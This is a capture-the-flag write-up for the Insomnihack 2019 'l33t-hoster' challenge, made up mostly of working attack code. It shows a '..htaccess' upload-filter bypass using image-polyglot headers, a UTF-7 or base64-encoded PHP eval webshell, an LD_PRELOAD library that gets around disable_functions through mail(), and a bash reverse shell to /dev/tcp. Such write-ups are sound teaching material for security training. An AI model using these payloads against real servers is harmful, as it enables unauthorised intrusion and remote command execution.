### References

- [@mdsnins, l33t-hoster.md, 2019-01-26](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md)
- [@yxxx, 利用htaccess绕黑名单 mail绕过disable function, 2019-01-26](https://xz.aliyun.com/t/3937)

**Tag: Upload bypass, disable_functions**

1.In source page can find a hint: `<!-- /?source -->`, source code get!

```php
$disallowed_ext = array("php", "php3", "php4", "php5", "php7", "pht", "phtm", "phtml", "phar", "phps",);

if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}
```

> **`array_pop`: Pop the element off the end of array**
>
> **`array_shift`: Shift an element off the beginning of array**
>
> **`explode`: Split a string by a string**
>
> **`implode`: Join array elements with a string**

Now, we know the server's upload procedures.

- Deny if file name is only extension. (like `.htaccess`, `.txt`)
- Deny if file has disallowed extension.
- Deny if `<?` is included in file contents.
- Deny if file can't pass `exif_imagetype`
- Deny if not `getimagesize` returns `1337 * 1337`
- Else, copy file to your own folder

So, we need make PHP to run our files :>

2.To attack the server, we must upload new `.htaccess` to run PHP with our own extensions. We can focus only shift array **once** when first exploded parts is empty. So, when we make file nams as `..htaccess`, it will be successfuly uploaded as `.htaccess`

```php
php > $name = "..htaccess";
php > print_r(explode(".", $name));
Array
(
    [0] =>
    [1] =>
    [2] => htaccess
)
```

However, `exif_imagetype` functions check first some bytes that is valid image's magic number, we have to fake it. In other words, we should make a file both satisfies image's magic number and `.htaccess` grammer.

In [PHP Manual](https://www.php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants), we can find the `.xbm` file (aka X Bitmap), it has a very interesting [format](https://en.wikipedia.org/wiki/X_BitMap) that contains the `#` character in header. So we can construct the following **valid** `.xbm` file, which passes `exif_imagetype` and `getimagesize`:

```tex
#define width 1337
#define height 1337
AddType application/x-httpd-php .xxx
```

```php
php > echo exif_imagetype("..htaccess");
16
php > var_dump(getimagesize("..htaccess"));
php shell code:1:
array(5) {
  [0] =>
  int(1337)
  [1] =>
  int(1337)
  [2] =>
  int(16)
  [3] =>
  string(26) "width="1337" height="1337""
  'mime' =>
  string(9) "image/xbm"
}
```

Also, another idea is provided in reference[2]. It uses the `.wbmp` file with value 15.

By fuzzing, he found a magic number `0x00` that would satisfy the required conditions. And the `.wbmp` file [format](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format) very much in line with. So just construct the `00008a398a39` file header:

```python
>>> htaccess = b"\x00\x00\x8a\x39\x8a\x39\nAddType application/x-httpd-php .xxx"
>>> with open('test', 'wb') as f:
...     f.write(htaccess)
...
43
```

```php
php > echo exif_imagetype("test");
15
php > var_dump(getimagesize("test"));
php shell code:1:
array(5) {
  [0] =>
  int(1337)
  [1] =>
  int(1337)
  [2] =>
  int(15)
  [3] =>
  string(26) "width="1337" height="1337""
  'mime' =>
  string(18) "image/vnd.wap.wbmp"
}
```

3.The next problem is that the content of the files cannot contain `<?`. It's too easy when you have XSS experiences, just use another encoding type such as `UTF-7` or `UTF-16`.

```tex
#define width 1337
#define height 1337
AddType application/x-httpd-php .xxx
php_flag display_errors 1
php_flag zend.multibyte 1   # Active specific encoding
php_value zend.script_encoding "UTF-7"
```

```php
php > echo iconv("UTF-8","UTF-7",'<?php @eval($_REQUEST[a]);?>');
+ADw?php +AEA-eval(+ACQAXw-REQUEST+AFs-a+AF0)+ADs?+AD4-
```

Or use utf-16 Big Endian encoding, refer: [bypass filter upload](https://thibaud-robin.fr/articles/bypass-filter-upload/)

But I like the method in reference[2] better, it uses the self-contained feature of `.htaccess` files:

```tex
#define width 1337
#define height 1337
AddType application/x-httpd-php .xxx
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.xxx"
```

So just base64 encoding the `shell.xxx` file simply. Be careful to let base64 decode properly.

Now, we get a webshell!

![](https://i.imgur.com/bPkFjn5.png)

scan the root directory using `scandir` function:

```tex
shell.xxx?a=var_dump(scandir('/'));
```

We can find two files, `flag` and `get_flag`. Use `highlight_file` function to try to read `flag`:

```tex
shell.xxx?a=highlight_file('/flag');
```

But here is nothing, maybe we have no permission. So we guess the goal is launch `get_flag`.

4.In phpinfo page, we can notice the `disable_functions`:

```tex
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,fopen,copy,rename,readfile,readlink,tmpfile,tempnam,touch,link,file_put_contents,file,ftp_connect,ftp_ssl_connect,
```

No `imap_open` blocked, think of the [CVE-2018-19518](https://github.com/Bo0oM/PHP_imap_open_exploit). But here also no imap module installed.

```tex
shell.xxx?a=var_dump(get_defined_functions());
```

Additionally, we can notice that `mail` and `putenv` functions are not disabled, we may be able to use **LD_PRELOAD injection**. refer: [无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/web/192052.html)

```bash
$ strace -f php -r "mail('','','','');" 2>&1 | grep -E "execve|fork|vfork"
execve("/usr/bin/php", ["php", "-r", "mail('','','','');"], 0x7ffdee9f1fa8 /* 60 vars */) = 0
[pid 12244] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], 0x56364f8b9eb0 /* 60 vars */ <unfinished ...>
[pid 12244] <... execve resumed>)       = 0
[pid 12245] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x562e1af8af98 /* 60 vars */) = -1 ENOENT (No such file or directory)
```

So we can use the `evil.c` and `evil.php` execute arbitrary commands:

```c
// (evil.c) gcc -shared -fPIC evil.c -o evil.so
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

__attribute__((constructor)) void preloadme() {
    const char* cmd = getenv("cmd");
    unsetenv("LD_PRELOAD");
    system(cmd);
}
```

```php
// (evil.php)
<?php
    putenv("LD_PRELOAD=./evil.so");
    $cmd = $_GET['cmd'];
    $cmdline = $cmd . " > /tmp/eval_output 2>&1";
    putenv("cmd=$cmdline");
    mail("", "", "", "");
    @highlight_file("/tmp/eval_output");
?>
```

But, how can we upload a valid `.so` file? Slightly modified `shell.xxx` to add an upload form, now we can bypass the restriction to upload any file.

5.Now we have an unrestricted webshell and just running `/get_flag` gives us a flag.

But, when we tried running `/get_flag`, it gives a simple captcha that is addition of 5 numbers. But, with some problem, `SIGALRM` is triggered too fast, we couldn't deal with the captcha.

So i added a reverse shell to `evil.php`:

```php
$reverse = $_GET['reverse'];
if ($reverse == 1) {
    putenv("cmd=bash -c 'exec bash -i &>/dev/tcp/192.168.200.1/9001 <&1'");
}
```

After getting the interactive shell, use the `trap` command to capture the `SIGALRM` signal which has a value of 14, and just calculate it slowly :>

![](https://i.imgur.com/aqX6Ufp.png)

#### Others

The answer given by the author is:

```bash
$ cd /; bash -c 'expr $(grep + /tmp/test)' | /get_flag > /tmp/test; cat /tmp/test
```

Also very nice :)